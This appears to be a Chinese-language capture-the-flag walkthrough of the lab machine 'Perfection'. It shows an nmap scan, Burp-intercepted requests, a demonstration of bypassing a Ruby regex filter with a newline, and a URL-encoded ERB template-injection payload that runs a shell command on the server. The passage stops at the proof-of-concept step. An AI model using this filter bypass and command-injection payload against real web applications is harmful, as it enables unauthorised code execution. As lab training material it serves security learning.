## Perfection
```
[★]$ nmap 10.129.229.121 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 09:54 CDT
Nmap scan report for 10.129.229.121
Host is up (0.012s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```
#### 浏览到80端口，我们遇到了一个“加权分数计算器”，这是一个学生的工具根据类别得分和百分比权重快速计算总分。
#### 查看About Us页面，其中有一个关于团队成员的部分，我们看到提到了一个团队成员那些显然不太了解安全编码的用户。这暗示了一些编码我们可以利用的web应用程序中的错误
Tina是我们团队的网络开发人员，她是Acme大学计算机科学专业的学生，非常聪明。是她提出了安全学生工具™的整个构想。她在web开发方面绝对是一个天才，但她并没有深入研究安全编码。
#### 此外，页脚提到了WEBrick 1.7.0，这是一个用于构建web服务器的Ruby库。
https://rubygems.org/gems/webrick/versions/1.7.0?locale=en
#### 检查/ weightedgrade端点后，我们看到它接受用户输入
![时间真的在过节](images/09210201.png)
#### 提交一些有效的输入，我们得到以下结果：
![时间真的在过节](images/09210202.png)
#### 我们继续再次发送Submit请求，但这次使用BurpSuite拦截它。
```
交互程序/脚本要你输入一份“成绩加权表”，格式是这样的：
Category：科目类别（比如 Math, Science, English）。
Grade：你在该科目的分数（0–100）。
Weight：该科目在总成绩里的权重（百分比），所有权重相加必须 =100。
```
#### 这允许我们进行修改反复提出要求，轻松地观察对方的反应。在网站上输出的格式和返回给我们的方式表明使用了模板引擎，它开启了服务器端模板注入（SSTI）的可能性。脆弱性。嵌入式Ruby （ERB）是一个允许嵌入Ruby的Ruby模板系统文本文档中的代码，通常在web应用程序中用于生成动态内容。考虑到这种可能性，我们输入有效载荷<%= %>(在Ruby web应用程序)放入Category字段，并尝试发送请求
#### 在Raw添加<%25%3d+%25>，浏览器连网，Forward
```
POST /weighted-grade-calc HTTP/1.1
Host: 10.129.229.121
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.229.121/weighted-grade-calc
Content-Type: application/x-www-form-urlencoded
Content-Length: 191
Origin: http://10.129.229.121
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

category1=<%25%3d+%25>test1&grade1=9&weight1=20&category2=test2&grade2=9&weight2=20&category3=test3&grade3=9&weight3=20&category4=test4&grade4=9&weight4=20&category5=test5&grade5=9&weight5=20
```
#### 在发送请求时，我们看到恶意输入被阻止，这表明正在进行某些过滤发生在服务器端。通常，正则表达式（regex）用于服务器端过滤恶意输入，这在Ruby语言中也是可能的。
![时间真的在过节](images/09210203.png)
#### Malicious input blocks 恶意输入块
### Ruby Regex Ruby正则表达式
#### Ruby有用于字符串和正则表达式匹配的=~操作符：
```
irb(main):003:0> "SampleText" =~ /^[a-zA-Z]+$/
=> 0
```
#### 如这里所见，字符串“SampleText”匹配正则表达式/^[a-zA-Z]+$/，这意味着它匹配只包含大写和小写字母的一行文本。但是，如果我们在输入中插入一个换行符和一些不匹配的字符正则表达式，例如{，并尝试用相同的正则表达式匹配它，我们可以观察到它仍然匹配：
```
irb(main):004:0> "SampleText\n{{}}" =~ /^[a-zA-Z]+$/
=> 0
```
#### 如果没有换行符，它将返回nil：
```
irb(main):008:0> "SampleText{{}}" =~ /^[a-zA-Z]+$/
=> nil
```
### Foothold
#### 知道了这一点，我们就可以通过在开始，然后我们的有效载荷在一个新的行
```
test
<%= IO.popen("sleep 10").readlines() %>
```
#### 此有效负载将导致服务器执行sleep 10命令，使页面挂起10秒钟。如果页面确实挂起，则表明注入成功。
#### 在Repeater窗口中，我们修改拦截的请求，将有效载荷包含在参数category1，确保对其进行url编码。我们手动包含换行符通过使用其url编码%0A：
```
test%0A<%25%3d+IO.popen("sleep+10").readlines()%25>
```
